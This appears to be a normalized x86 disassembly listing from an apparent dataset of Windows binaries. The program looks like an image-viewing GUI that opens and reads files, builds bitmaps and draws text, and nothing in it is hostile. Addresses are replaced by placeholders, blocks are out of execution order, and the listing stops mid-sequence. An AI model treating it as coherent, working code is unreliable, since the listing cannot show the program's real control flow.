mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax [ esp + 0x7c0 ]
push eax
lea ecx [ esp + 0x48 ]
call sub_401e80
jmp r-xdata
cmp esi 0xc
jl r-xdata
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ esi + 0x10 ]
push ecx
push eax
push edx
lea ebx [ esi - 0x4 ]
push edi
mov ecx ebx
call sub_401150
test eax eax
jne r-xdata
mov eax rw-data
push ebx
call sub_439280
add esp 0x4
cmp eax 0x7
je r-xdata
mov eax ecx
sub eax edx
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
push ebp
push ebp
push ebp
push ebp
push 0x1
push ecx
call sub_466930
mov edx [ rw-data ]
add esp 0x18
push ebp
push ebp
push edx
call [ InvalidateRect@IAT ]
cmp [ rw-data ] ebp
jne r-xdata
push 0x1
call sub_4290f0
mov eax [ rw-data ]
add esp 0x4
cmp eax ebp
je r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov cl [ ebp + rw-data ]
test cl cl
lea eax [ ebp + rw-data ]
jne r-xdata
lea eax [ esi - 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
push eax
call sub_421f40
mov esi eax
push esi
call sub_457f40
mov ebx [ lstrcpynA@IAT ]
add esp 0x8
push eax
push esi
lea ecx [ esp + 0x138 ]
push ecx
call ebx
push esi
call sub_457f40
add esp 0x4
mov edi 0xfffffffd
push esi
sub edi eax
call [ lstrlenA@IAT ]
add edi eax
push edi
push esi
call sub_457f40
add esp 0x4
add eax esi
push eax
lea edx [ esp + 0x23c ]
push edx
call ebx
cmp [ esp + 0x1c ] 0x4
mov esi [ lstrcatA@IAT ]
jne r-xdata
test [ ebp + rw-data ] 0x10
mov [ esp + 0x17 ] 0x0
jne r-xdata
mov edx esi
and dl 0x3
cmp dl 0x1
jle r-xdata
mov ebp [ ebp ]
cmp ebp [ ebx + rw-data ]
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] edi
mov [ esp + 0x44 ] 0x0
jne r-xdata
mov eax [ esp + 0x44 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
push eax
lea ecx [ esp + 0x44 ]
call sub_4024d0
lea edx [ esp + 0x40 ]
push edx
mov ecx rw-data
mov [ esp + 0x7ac ] 0x3
call sub_407460
cmp [ esp + 0x58 ] esi
mov [ esp + 0x7a8 ] 0x0
jb r-xdata
push ebx
mov ecx rw-data
call sub_407460
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
mov eax [ esp + 0x7c ]
add esi 0x70
lea ecx [ esi - 0x4 ]
cmp ecx eax
jne r-xdata
cmp edx ecx
je r-xdata
push ebp
push edi
mov ecx rw-data
call sub_46a850
mov esi [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
cmp edi eax
je r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x10
jb r-xdata
mov eax [ esp + 0x38 ]
mov ecx [ eax ]
push eax
mov [ esp + 0x7ac ] 0xffffffff
push ecx
lea edx [ esp + 0x98 ]
push ebp
push ebp
push eax
call [ InvalidateRect@IAT ]
jmp r-xdata
push eax
lea ecx [ esp + 0x44 ]
call sub_402510
mov eax [ esp + 0x58 ]
mov edi 0x10
cmp eax edi
mov eax [ esp + 0x44 ]
jae r-xdata
mov eax rw-data
test [ ebp + rw-data ] 0x20
je r-xdata
push r--data
lea eax [ esp + 0x238 ]
push eax
call esi
cmp [ esp + 0x58 ] 0x10
mov eax [ esp + 0x44 ]
mov [ esp + 0x17 ] 0x1
mov [ esp + 0x7b8 ] 0x1
jae r-xdata
cmp [ rw-data ] 0x1c
je r-xdata
mov ecx [ rw-data ]
cmp ecx [ ebp + 0x8 ]
jne r-xdata
mov esi [ rw-data ]
cmp [ esi + 0x14 ] ebp
jb r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov [ rw-data ] edx
mov [ rw-data ] edi
jmp r-xdata
cmp esi 0xa
je r-xdata
sub ecx edx
mov edi edx
mov edx ecx
shr ecx 0x2
xor eax eax
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov esi [ rw-data ]
mov edi [ esp + 0x24 ]
xor ebp ebp
push eax
lea eax [ esp + 0x238 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov edx [ rw-data ]
add esp 0xc
lea ecx [ esp + 0x234 ]
push ecx
push edx
call [ SetWindowTextA@IAT ]
mov eax [ rw-data ]
cmp eax ebp
mov [ rw-data ] 0x12f
je r-xdata
mov eax rw-data
mov eax rw-data
jmp r-xdata
mov eax [ rw-data ]
jmp r-xdata
push eax
call sub_457f40
add esp 0x4
test eax eax
jle r-xdata
lea eax [ esp + 0x44 ]
push r--data
lea edx [ esp + 0x134 ]
push edx
call esi
lea eax [ esp + 0x234 ]
push eax
lea ecx [ esp + 0x134 ]
push ecx
call esi
lea edx [ esp + 0x130 ]
push edx
lea ecx [ esp + 0x44 ]
call sub_402510
jmp r-xdata
mov cl [ ebp + rw-data ]
test cl cl
lea eax [ ebp + rw-data ]
je r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x20 ] eax
je r-xdata
lea eax [ esp + 0x44 ]
cmp [ esp + 0x1c ] 0x4
jne r-xdata
cmp edi 0x40
mov [ esp + 0x2c ] ebp
mov [ esp + 0x28 ] ebp
jle r-xdata
cmp esi 0xd
je r-xdata
mov ecx [ rw-data ]
push sub_45ba40
push 0x7d0
push 0x3
push ecx
call [ SetTimer@IAT ]
mov [ rw-data ] eax
push eax
mov eax [ rw-data ]
push eax
call [ KillTimer@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x5c
push 0x1
lea ecx [ esp + 0x48 ]
call sub_4017f0
test [ ebp + rw-data ] 0x10
jne r-xdata
push eax
lea ecx [ esp + 0x134 ]
push ecx
call [ lstrcpyA@IAT ]
mov ecx [ esp + 0x20 ]
push ecx
call [ CloseHandle@IAT ]
mov al [ esp + 0x7b8 ]
test al al
jne r-xdata
push 0x0
mov ebp eax
push ebp
call [ GetFileSize@IAT ]
mov ebx [ SetFilePointer@IAT ]
push 0x0
mov esi eax
push 0x0
lea ecx [ esi - 0x4 ]
push ecx
push ebp
call ebx
mov edi [ ReadFile@IAT ]
push 0x0
lea edx [ esp + 0x1c ]
push edx
push 0x4
lea eax [ esp + 0x38 ]
push eax
push ebp
mov [ esp + 0x40 ] 0x0
call edi
mov eax [ esp + 0x2c ]
cmp eax esi
jb r-xdata
mov ecx [ esp + 0x58 ]
cmp ecx 0x10
mov eax [ esp + 0x44 ]
jae r-xdata
xor edx edx
cmp edi 0x24
setg dl
lea edx [ edx + edx + 0x4 ]
mov esi edx
mov esi 0x8
jmp r-xdata
cmp esi 0x11
je r-xdata
mov ecx [ rw-data ]
cmp ecx edi
mov eax [ rw-data ]
mov esi eax
jae r-xdata
cmp [ rw-data ] 0x1d
je r-xdata
push r--data
lea ecx [ esp + 0x44 ]
call sub_402010
cmp [ esp + 0x58 ] 0x10
jb r-xdata
cmp [ esp + 0x1c ] 0x4
je r-xdata
cmp [ esp + 0x58 ] 0x10
mov [ esp + 0x7a8 ] 0x0
jb r-xdata
push 0x0
sub esi eax
push 0x0
sub esi 0x4
push esi
push ebp
call ebx
push 0x0
lea ecx [ esp + 0x1c ]
push ecx
push 0x28
lea edx [ esp + 0xa8 ]
push edx
push ebp
call edi
cmp [ esp + 0x18 ] 0x28
jne r-xdata
test eax eax
je r-xdata
mov esi [ esp + 0x44 ]
jmp r-xdata
lea eax [ esp + 0x44 ]
lea esi [ esp + 0x44 ]
mov eax edi
cdq
idiv esi
cmp edx ebp
mov ebp eax
je r-xdata
mov esi edi
cmp esi edi
jle r-xdata
cmp esi 0x15
je r-xdata
push eax
call sub_457f40
add eax esi
add esp 0x4
lea ecx [ esp + 0x40 ]
push eax
call sub_402010
cmp [ esp + 0x58 ] edi
mov eax [ esp + 0x44 ]
jae r-xdata
mov esi rw-data
mov eax esi
mov ecx [ rw-data ]
cmp ecx edi
mov eax [ rw-data ]
mov esi eax
jae r-xdata
lea eax [ esp + 0x44 ]
mov [ esp + 0x7bc ] eax
mov edx [ esp + 0x44 ]
mov [ esp + 0x7bc ] edx
jmp r-xdata
push r--data
lea ecx [ esp + 0x44 ]
call sub_402010
mov eax [ ebp + rw-data ]
and eax 0xf
lea ecx [ esp + eax * 4 + 0x8c ]
push ecx
lea ecx [ esp + 0x44 ]
mov [ esp + 0x94 ] 0x706d62
mov [ esp + 0x98 ] 0x67706a
mov [ esp + 0x9c ] 0x676e70
call sub_402010
mov [ esp + 0x7bc ] 0x0
jmp r-xdata
mov eax [ esp + 0x44 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
push r--data
lea eax [ esp + 0xa0 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x1
shl edx 0x10
push edx
push eax
call sub_439280
mov ecx [ esp + 0x84 ]
add esp 0x4
push eax
push esi
push 0x0
call sub_4411b0
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rw-data ] 0x1c
jne r-xdata
test ebp ebp
jne r-xdata
lea ebp [ eax + 0x1 ]
cmp esi 0x9
je r-xdata
mov ecx [ esp + 0x54 ]
cmp [ eax + ecx - 0x1 ] 0x3a
jne r-xdata
lea eax [ esp + 0x44 ]
mov esi rw-data
mov eax esi
jmp r-xdata
cmp [ esp + 0x1c ] 0x4
je r-xdata
mov [ rw-data ] al
mov eax [ rw-data ]
mov [ rw-data ] eax
cmp [ esp + 0x1c ] 0x4
je r-xdata
cmp [ esp + 0x1c ] 0x4
jne r-xdata
mov ecx rw-data
call sub_403ab0
mov ecx rw-data
call sub_401420
lea ecx [ esp + 0x40 ]
call sub_4480e0
lea ecx [ esp + 0x34 ]
mov [ esp + 0x7a8 ] 0xffffffff
call sub_475190
jmp r-xdata
mov eax ebx
cdq
idiv esi
mov ecx [ esp + 0x10 ]
mov edi eax
imul eax ebp
cmp eax ecx
jle r-xdata
mov ebp 0x1
mov eax [ esp + 0x10 ]
imul eax ebx
mov [ esp + 0x20 ] eax
mov [ esp + 0x2c ] ebp
mov [ esp + 0x28 ] ebp
fild [ esp + 0x20 ]
fidiv [ esp + 0x24 ]
fsqrt
call sub_4b64c4
mov ecx eax
mov eax ebx
cdq
idiv ecx
mov esi eax
cmp esi ebp
jne r-xdata
cmp esi 0xc
je r-xdata
dec ecx
push ecx
lea ecx [ esp + 0x44 ]
call sub_401f60
xor ebx ebx
mov [ esp + 0x78 ] ebx
mov [ esp + 0x7c ] ebx
mov [ esp + 0x80 ] ebx
mov eax [ esp + 0x2c ]
add eax 0xffffffd8
push ebx
push eax
lea ecx [ esp + 0x7c ]
mov [ esp + 0x7b0 ] 0x7
call sub_46b020
mov esi [ esp + 0x78 ]
cmp esi ebx
mov ebp [ esp + 0x7c ]
jne r-xdata
mov eax [ esp + 0xb8 ]
mov ecx [ esp + 0xac ]
mov edx [ esp + 0xb4 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1c
mov [ rw-data ] ecx
mov ecx [ esp + 0xbc ]
mov [ rw-data ] edx
mov edx [ esp + 0xc0 ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
jne r-xdata
cmp [ rw-data ] 0xc
jge r-xdata
mov al [ esp + 0x17 ]
test al al
je r-xdata
mov ecx rw-data
call sub_462cf0
mov [ esp + 0x20 ] edi
mov ecx [ esp + 0x30 ]
mov eax ebx
sub eax ecx
cdq
idiv esi
mov edi eax
mov eax edi
cdq
idiv esi
cmp edx ebp
jne r-xdata
mov esi 0x1
cmp esi 0x10
je r-xdata
mov eax ebp
sub eax esi
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x24 ]
cmp ecx [ esp + 0xb0 ]
jne r-xdata
mov eax [ esp + 0xb0 ]
push eax
mov ecx rw-data
call sub_421f10
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ ecx + rw-data ]
xor eax eax
jmp r-xdata
mov ebx [ esp + 0x1c ]
mov edx [ rw-data ]
imul ebx ebx 0x12c
mov eax [ ebx + rw-data ]
test eax eax
mov [ rw-data ] edx
je r-xdata
mov [ rw-data ] 0x3f800000
lea ebp [ eax + 0x1 ]
mov ebp eax
test ebp ebp
jne r-xdata
cmp esi 0x14
je r-xdata
mov eax ebp
sub eax esi
xor eax eax
jmp r-xdata
mov edx [ esp + 0x20 ]
push ebx
lea ecx [ esp + 0x1c ]
push ecx
push eax
push esi
push edx
call edi
cmp esi ebx
jne r-xdata
xor ebx ebx
mov [ esp + 0x60 ] ebx
mov [ esp + 0x64 ] ebx
mov [ esp + 0x68 ] ebx
mov eax [ esp + 0x2c ]
add eax 0xffffffd8
push ebx
push eax
lea ecx [ esp + 0x64 ]
mov [ esp + 0x7b0 ] 0x5
call sub_46b020
mov ebp [ esp + 0x60 ]
cmp ebp ebx
mov esi [ esp + 0x64 ]
jne r-xdata
cmp [ rw-data ] 0x10
mov ebx [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x10
jb r-xdata
mov edx [ rw-data ]
mov ecx rw-data
mov [ rw-data ] edx
call sub_401420
cmp [ esp + 0x1c ] 0x4
je r-xdata
call sub_40af00
mov esi [ esp + 0x70 ]
push eax
push 0x0
mov ecx esi
call sub_4440b0
mov [ rw-data ] eax
call sub_40af00
push eax
push 0x0
mov ecx esi
call sub_444100
mov ebx [ esp + 0x28 ]
mov ecx [ ebx + rw-data ]
mov esi [ ebx + rw-data ]
mov edx [ rw-data ]
mov [ rw-data ] eax
lea eax [ ecx + edx ]
cdq
add ecx esi
idiv ecx
mov ebp [ ebx + rw-data ]
mov edx [ rw-data ]
mov [ rw-data ] esi
mov [ rw-data ] ebp
mov ecx eax
mov eax [ ebx + rw-data ]
lea ebx [ eax + edi ]
add eax edx
cdq
add ebx ebp
idiv ebx
mov [ rw-data ] ecx
mov ebx eax
mov eax [ esp + 0x28 ]
mov edx [ eax + rw-data ]
mov al [ esp + 0x17 ]
test al al
mov [ rw-data ] ebx
mov [ rw-data ] edx
je r-xdata
add edi 0x4
lea edi [ eax + eax * 2 ]
shl edi 0x2
test edi edi
mov [ rw-data ] eax
jle r-xdata
xor eax eax
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp esi edi
jle r-xdata
mov ebp edi
cmp ebp edi
jle r-xdata
mov ebp 0x1
jmp r-xdata
mov eax [ esp + 0x1c ]
imul eax eax 0x12c
mov ecx [ eax + rw-data ]
mov esi [ eax + rw-data ]
test esi esi
mov edx [ eax + rw-data ]
mov edi [ eax + rw-data ]
mov [ esp + 0x2c ] ecx
mov ecx [ eax + rw-data ]
mov [ esp + 0x28 ] ecx
mov [ esp + 0x20 ] edx
jne r-xdata
mov eax [ esp + 0x78 ]
test eax eax
mov [ esp + 0x7a8 ] 0x4
je r-xdata
mov ebx [ esp + 0x78 ]
xor esi esi
mov [ esp + 0x60 ] esi
mov [ esp + 0x64 ] esi
mov [ esp + 0x68 ] esi
mov eax [ esp + 0xb0 ]
push eax
mov ecx rw-data
mov [ esp + 0x7ac ] 0x8
call sub_421f10
mov eax [ esp + 0xb0 ]
cmp eax esi
mov [ esp + 0x10 ] esi
jle r-xdata
cmp [ esp + 0x18 ] eax
jne r-xdata
mov eax esi
sub eax ebp
xor eax eax
jmp r-xdata
mov ecx rw-data
xor edi edi
call sub_4010c0
test eax eax
jle r-xdata
mov ebx rw-data
mov ebx rw-data
jmp r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
mov [ rw-data ] eax
mov eax [ rw-data ]
mov edx ecx
push 0x1
push eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] 0x1
mov [ rw-data ] 0x3f800000
call sub_466930
mov ecx [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
mov edx [ esp + 0x7bc ]
test edx edx
je r-xdata
cmp ecx 0x1
mov [ rw-data ] ecx
mov [ rw-data ] ebx
jg r-xdata
mov eax [ esp + 0xac ]
mov esi [ esp + 0xb4 ]
mov ebp [ esp + 0xb8 ]
mov ecx [ esp + 0xbc ]
mov ebx [ esp + 0xc0 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] ebp
mov [ rw-data ] ecx
mov [ rw-data ] ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] eax
lea eax [ eax + eax * 2 ]
shl eax 0x2
test eax eax
jle r-xdata
mov eax [ ebx + rw-data ]
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x80
push 0x0
push 0x0
push 0x0
push 0x190
push 0x0
push 0x0
push 0x0
push 0xc
call [ CreateFontA@IAT ]
mov [ rw-data ] eax
mov eax [ esp + 0x10 ]
cdq
idiv ebp
mov ecx eax
mov eax ebx
cdq
idiv esi
cmp eax ecx
mov edi eax
jl r-xdata
mov esi edi
mov eax [ esp + 0x24 ]
cmp esi eax
jle r-xdata
mov ebp [ rw-data ]
lea ebp [ ebp + ebp * 2 ]
shl ebp 0x2
test ebp ebp
jle r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
push 0x0
push eax
lea ecx [ esp + 0x64 ]
call sub_41d110
mov eax [ rw-data ]
add eax 0xfffffff4
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea ebp [ eax + eax * 2 ]
lea eax [ esp + 0x90 ]
shl ebp 0x2
push eax
lea ecx [ ebp + rw-data ]
call sub_4209f0
mov eax [ ebp + rw-data ]
mov esi [ esp + 0x90 ]
cmp esi eax
mov edi [ esp + 0x60 ]
mov [ esp + 0x10 ] 0x0
je r-xdata
push ebx
lea ecx [ esp + 0xf8 ]
call sub_4024d0
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0xf8 ]
push edx
lea ecx [ esp + 0x118 ]
mov [ esp + 0x7b0 ] 0x9
call sub_40bcb0
push eax
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x7ac ] 0xa
call sub_432cd0
lea eax [ esp + 0xd4 ]
push eax
lea ecx [ esp + 0x94 ]
push ecx
lea ecx [ esp + 0x3c ]
mov [ esp + 0x7b0 ] 0xb
call sub_46bb20
lea ecx [ esp + 0xd4 ]
call sub_4480e0
lea ecx [ esp + 0x110 ]
call sub_4480e0
mov edx [ esp + 0x108 ]
lea ecx [ esp + 0xf4 ]
lea ebx [ ebx + edx + 0x1 ]
mov [ esp + 0x7a8 ] 0x8
call sub_4480e0
mov eax [ esp + 0xb0 ]
inc esi
cmp esi eax
mov [ esp + 0x10 ] esi
jl r-xdata
sub esi ebp
xor esi esi
jmp r-xdata
push ebx
lea edx [ esp + 0x1c ]
push edx
push eax
mov eax [ esp + 0x2c ]
push ebp
push eax
call edi
cmp ebp ebx
jne r-xdata
xor esi esi
lea ecx [ ecx ]
cmp [ esp + 0x58 ] 0x10
jb r-xdata
push 0x1
call sub_4290f0
mov edx [ rw-data ]
add esp 0x4
push 0x0
push 0x0
push edx
call [ InvalidateRect@IAT ]
mov eax edx
lea esi [ eax + 0x1 ]
lea ecx [ ecx ]
mov eax [ rw-data ]
mov edx ecx
imul edx esi
sub eax edx
cdq
dec ecx
idiv ecx
mov [ rw-data ] eax
mov [ rw-data ] 0x0
jmp r-xdata
mov edx 0x200
lea ecx [ esp + 0x40 ]
push ecx
push eax
call [ GetClientRect@IAT ]
mov eax [ esp + 0x48 ]
sub eax [ esp + 0x40 ]
add eax 0x3
cdq
and edx 0x3
add edx eax
sar edx 0x2
shl edx 0x2
cmp edx 0x200
jge r-xdata
mov edx [ esp + 0x20 ]
mov [ rw-data ] edi
imul edi esi
lea ecx [ esi - 0x1 ]
imul ecx [ esp + 0x28 ]
mov [ rw-data ] edx
add ecx edi
lea edi [ eax + edx ]
mov eax [ esp + 0x2c ]
imul edi ebp
lea edx [ ebp - 0x1 ]
imul edx eax
add edi edx
mov edx [ ebx + rw-data ]
mov [ rw-data ] edx
mov edx [ esp + 0x28 ]
mov [ rw-data ] edx
mov [ rw-data ] eax
lea eax [ ecx + 0x3 ]
cdq
and edx 0x3
add edx eax
sar edx 0x2
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] ebp
mov [ rw-data ] ecx
mov [ rw-data ] edi
mov [ rw-data ] ebp
shl edx 0x2
mov esi edi
mov ebx ecx
mov [ esp + 0x28 ] edi
jmp r-xdata
add eax 0x4
cmp [ esp + 0x1c ] 0x4
je r-xdata
mov edi ecx
jmp r-xdata
cdq
idiv esi
test edx edx
jne r-xdata
mov esi eax
mov eax [ esp + 0x18 ]
add eax ecx
cdq
lea ebx [ edi + ecx ]
idiv ebx
mov esi eax
test esi esi
jg r-xdata
add ebp 0x4
mov eax [ esp + 0xb0 ]
cmp [ esp + 0x10 ] eax
je r-xdata
mov [ esp + 0x30 ] 0x0
nop
lea ecx [ esp + 0x5c ]
mov [ esp + 0x7a8 ] 0x4
call sub_462cf0
jmp r-xdata
cmp [ rw-data ] 0xc
jl r-xdata
cmp [ esp + 0x18 ] esi
jne r-xdata
mov edx [ rw-data ]
push edx
push eax
mov eax [ ecx + 0x14 ]
push eax
push 0x0
call sub_401150
test eax eax
je r-xdata
mov eax rw-data
mov eax [ esp + 0x38 ]
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x44 ] 0x0
mov ecx [ eax ]
push eax
push ecx
lea ecx [ esp + 0x98 ]
push ecx
lea ecx [ esp + 0x40 ]
mov [ esp + 0x7b4 ] 0xffffffff
call sub_46b3f0
mov edx [ esp + 0x38 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax 0x1
jmp r-xdata
mov eax [ esp + 0x44 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
mov ecx rw-data
call sub_401e80
jmp r-xdata
mov eax [ rw-data ]
add edi ebp
imul edi ebx
sub eax edi
cdq
dec ebx
idiv ebx
mov [ rw-data ] eax
mov [ rw-data ] 0x0
jmp r-xdata
cmp ebx 0x1
jg r-xdata
mov ecx rw-data
mov [ rw-data ] 0x3f800000
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
call sub_401420
mov ecx [ rw-data ]
push 0x0
push r--data
push r--data
push ecx
call [ MessageBoxA@IAT ]
mov eax [ esp + 0x38 ]
mov ecx [ eax ]
push eax
mov [ esp + 0x7ac ] 0xffffffff
push ecx
lea edx [ esp + 0x74 ]
jmp r-xdata
push 0x0
call [ GetDC@IAT ]
mov edi eax
push edi
call [ CreateCompatibleDC@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax [ esp + 0x20 ]
mov esi eax
mov ebx edx
mov [ esp + 0x28 ] eax
xor eax eax
push eax
push eax
mov ecx 0xb
lea edi [ esp + 0x380 ]
[ edi ]
mov [ esp + 0x384 ] edx
lea edx [ esp + 0x74 ]
push edx
push eax
mov [ esp + 0x398 ] eax
lea eax [ esp + 0x388 ]
push eax
neg esi
push 0x0
mov [ esp + 0x390 ] 0x28
mov [ esp + 0x398 ] esi
mov [ esp + 0x39c ] 0x1
mov [ esp + 0x39e ] 0x18
call [ CreateDIBSection@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
lea ebp [ eax + 0x1 ]
jmp r-xdata
mov ebp eax
jmp r-xdata
mov eax [ esp + 0x24 ]
cdq
idiv esi
test edx edx
je r-xdata
mov esi 0x1
push eax
mov ecx rw-data
call sub_4299f0
mov eax [ esp + 0xb0 ]
mov edx [ esp + 0x7c ]
mov ecx eax
shl ecx 0x4
add ecx ebx
cmp edx ecx
jne r-xdata
mov ecx rw-data
call sub_403ab0
lea ecx [ esp + 0x5c ]
call sub_462cf0
lea ecx [ esp + 0x74 ]
mov [ esp + 0x7a8 ] 0x4
call sub_462cf0
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov [ esp + 0x7b8 ] 0x0
cmp [ esp + 0xb0 ] ebx
jle r-xdata
mov [ rw-data ] edi
mov ecx [ rw-data ]
lea eax [ esi + ecx ]
push ebx
push eax
call sub_401380
add esp 0x8
test al al
jne r-xdata
push edx
lea ecx [ esp + 0x40 ]
call sub_46b3f0
mov eax [ esp + 0x38 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
test eax eax
je r-xdata
push ebp
call [ DeleteObject@IAT ]
cmp [ esp + 0x1c ] 0x4
mov ecx [ rw-data ]
mov [ rw-data ] ecx
je r-xdata
mov edx [ esp + 0x20 ]
add ebp edx
imul ebp eax
dec eax
imul eax [ esp + 0x2c ]
add ebp eax
cmp ebp [ esp + 0x10 ]
jle r-xdata
inc eax
xor ecx ecx
test eax eax
jle r-xdata
xor ecx ecx
test eax eax
jle r-xdata
mov eax [ rw-data ]
mov ecx [ esp + 0x30 ]
push 0xffffffff
add ecx eax
lea eax [ edi + 0xc ]
push 0x0
push eax
call sub_401dd0
mov eax [ esp + 0x10 ]
mov edi [ edi + 0x28 ]
mov edx [ esp + 0x60 ]
mov ecx [ esp + 0x30 ]
mov [ edx + edi * 4 ] eax
mov esi [ esi ]
inc eax
mov [ esp + 0x10 ] eax
mov eax [ ebp + rw-data ]
add ecx 0x1c
cmp esi eax
mov [ esp + 0x30 ] ecx
jne r-xdata
push eax
lea ecx [ esp + 0xd8 ]
call sub_4024d0
lea ecx [ esp + 0xd4 ]
push ecx
lea edx [ esp + 0x94 ]
push edx
lea ecx [ esp + 0x3c ]
mov [ esp + 0x7b0 ] 0xc
call sub_432c60
mov edi [ eax ]
lea ecx [ esp + 0xd4 ]
mov [ esp + 0x7a8 ] 0x8
call sub_4480e0
cmp edi [ esp + 0x38 ]
je r-xdata
xor esi esi
mov edi 0x1c
mov ecx rw-data
inc edi
add esi 0x1c
call sub_4010c0
cmp edi eax
jl r-xdata
call [ GdiFlush@IAT ]
push ebp
push esi
call [ SelectObject@IAT ]
push edi
push 0x0
call [ ReleaseDC@IAT ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x6c ]
push esi
push edx
push ebx
push eax
sub esp 0x428
mov edi esp
mov ecx 0x10a
lea esi [ esp + 0x7b0 ]
[ edi ] [ esi ]
movzx ecx [ esp + 0x7be ]
push ebp
or ecx 0x10000000
push ecx
mov ecx [ esp + 0x4b0 ]
push 0x0
call sub_43e840
cmp [ esp + 0x1c ] 0x4
je r-xdata
mov ecx [ rw-data ]
push ecx
push esi
call [ SelectObject@IAT ]
push 0x1
push esi
call [ SetBkMode@IAT ]
push 0xffffff
push esi
call [ SetTextColor@IAT ]
mov edx [ esp + 0x30 ]
mov eax ecx
mov ecx [ esp + 0x18 ]
sub eax edx
add eax ecx
cdq
idiv ebx
mov esi eax
test esi esi
jg r-xdata
test edi edi
mov [ esp + 0x7b8 ] 0x0
je r-xdata
xor edx edx
nop
jmp r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx 0x10
jb r-xdata
mov edi edx
lea eax [ esi + eax + 0x4 ]
mov eax [ esi + eax + 0x4 ]
jmp r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
add ecx esi
cmp eax 0x10
mov eax [ rw-data ]
jae r-xdata
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
push edx
call [ GetDC@IAT ]
mov ebx [ esp + 0x18 ]
mov edi eax
mov eax [ rw-data ]
cmp ebx eax
jge r-xdata
mov esi 0x1
push edi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
add eax edx
xor esi esi
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
mov eax [ esp + 0xb0 ]
inc ecx
add edx 0x10
cmp ecx eax
jl r-xdata
mov eax [ edi + ecx * 4 ]
mov ebp [ rw-data ]
shl eax 0x4
add eax ebp
mov edx ebx
mov esi [ edx ]
mov [ eax ] esi
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov esi [ edx + 0x8 ]
mov [ eax + 0x8 ] esi
mov edx [ edx + 0xc ]
add ebx 0x10
mov [ eax + 0xc ] edx
mov eax [ esp + 0xb0 ]
inc ecx
cmp ecx eax
jl r-xdata
mov edx [ rw-data ]
lea ecx [ esi + edx ]
push ebp
call sub_402510
mov eax [ rw-data ]
mov eax [ esi + eax + 0x14 ]
lea ecx [ esp + 0x74 ]
lea ebp [ eax + ebp + 0x1 ]
mov [ esp + 0x7a8 ] 0x5
call sub_4480e0
mov eax [ esp + 0xb0 ]
inc ebx
add esi edi
cmp ebx eax
jl r-xdata
mov eax [ rw-data ]
add eax esi
push ebp
push eax
call sub_428d60
add esp 0x8
test al al
je r-xdata
mov ecx [ rw-data ]
lea edx [ eax + ecx + 0x1 ]
push edx
lea ecx [ esp + 0x78 ]
call sub_4024d0
cmp [ rw-data ] edi
mov [ esp + 0x7a8 ] 0x6
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
push 0x0
push 0x0
push 0x0
push 0x0
push 0x80
push 0x0
push 0x0
push 0x0
